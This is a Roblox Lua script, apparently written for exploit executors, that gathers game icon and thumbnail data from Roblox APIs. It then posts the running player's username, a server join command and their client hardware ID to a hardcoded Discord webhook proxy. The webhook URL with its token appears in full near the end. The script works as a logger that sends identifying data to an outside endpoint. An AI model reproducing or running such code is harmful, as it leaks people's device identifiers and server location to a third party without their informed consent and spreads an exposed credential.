wait()
-- // Service & Exc Function // --
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer
local Asset = MarketplaceService:GetProductInfo(game.PlaceId)
local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

assert(httprequest, "HttpRequest function not found in this executor.")
print("[INFO]: HttpRequest function found.")

-- // Get UniverseId // --
local data = httprequest({
    Url = "https://apis.roblox.com/universes/v1/places/" .. tostring(game.PlaceId) .. "/universe",
    Method = "GET"
})

assert(data and data.Body, "Failed to fetch UniverseId.")
print("[INFO]: Successfully fetched UniverseId.")

local universe = HttpService:JSONDecode(data.Body)
local resultUniverseId = universe.universeId or tostring(next(universe))  -- Fallback for universeId.
print("[INFO]: UniverseId is " .. resultUniverseId)

-- // Get Icon ID & URL // --
local data1 = httprequest({
    Url = "https://thumbnails.roblox.com/v1/games/icons?universeIds=" .. resultUniverseId .. "&size=512x512&format=Png&isCircular=false",
    Method = "GET"
})

assert(data1 and data1.Body, "Failed to fetch Icon ID.")
print("[INFO]: Successfully fetched Icon ID data.")

local IconIdTable = HttpService:JSONDecode(data1.Body)
local icon = IconIdTable.data[1].imageUrl

assert(icon, "Icon URL not found.")
print("[INFO]: Icon URL is " .. icon)

-- // Get Thumbnail ID // --
local data2 = httprequest({
    Url = "https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=" .. resultUniverseId .. "&size=768x432&format=Png&isCircular=false",
    Method = "GET"
})

assert(data2 and data2.Body, "Failed to fetch Thumbnail ID.")
print("[INFO]: Successfully fetched Thumbnail ID data.")

local thumbnailIdTable = HttpService:JSONDecode(data2.Body)
for i,v in thumbnailIdTable.data[1].thumbnails do
    for a,b in v do
        if type(b) == "number" then
            thumbnailId = b
        end
    end
end

assert(thumbnailId, "Thumbnail ID not found.")
print("[INFO]: Thumbnail ID is " .. thumbnailId)

-- // Get Thumbnail URL // --
local data3 = httprequest({
    Url = "https://thumbnails.roblox.com/v1/games/" .. resultUniverseId .. "/thumbnails?thumbnailIds=" .. thumbnailId .. "&size=768x432&format=Png&isCircular=false",
    Method = "GET"
})

assert(data3 and data3.Body, "Failed to fetch Thumbnail URL.")
print("[INFO]: Successfully fetched Thumbnail URL data.")

local thumbnailTable = HttpService:JSONDecode(data3.Body)
local thumbnail = thumbnailTable.data and thumbnailTable.data[1] and thumbnailTable.data[1].imageUrl
assert(thumbnail, "Thumbnail URL not found.")
print("[INFO]: Thumbnail URL is " .. thumbnail)

-- // Embed // --
local finalData = {
	["embeds"] = {{
        ["color"] = tonumber(0xFFFFFF),
        ["title"] = "— // Game History // —",
        ["image"] = {["url"] = thumbnail},
        ["thumbnail"] = {["url"] = icon},
        ["fields"] = {
            {
                ["name"] = "User-Name:",
                ["value"] = "- " .. player.Name,
                ["inline"] = false
            },
            {
                ["name"] = "Join Script:",
                ["value"] = '- game:GetService("TeleportService"):TeleportToPlaceInstance(' ..tostring(game.PlaceId).. ', ' ..tostring(game.JobId).. ', game.Players.LocalPlayer)',
                ["inline"] = false
            },
            {
                ["name"] = "Hardware ID:",
                ["value"] = '- ' .. game:GetService("RbxAnalyticsService"):GetClientId(),
                ["inline"] = false
            },
            {
                ["name"] = Asset.Name,
                ["value"] = "",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "Credit: Rama102031 | " .. os.date("%d/%m/%y - %H:%M:%S %p")
        }
    }}
}
print("[INFO]: Embed data created successfully.")

-- // Webhook // --
local response = httprequest({
    Url = "https://webhook.lewisakura.moe/api/webhooks/1203835442051678228/i36UA_ZuhEy6CskqtIHQIxBd89tGDr-TIzocnKJGqfYrL0yn8BbyyXnT72d8ovvhzaWz/queue",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(finalData)
})

assert(response, "Failed to send webhook request.")
print("[INFO]: Webhook sent successfully.")
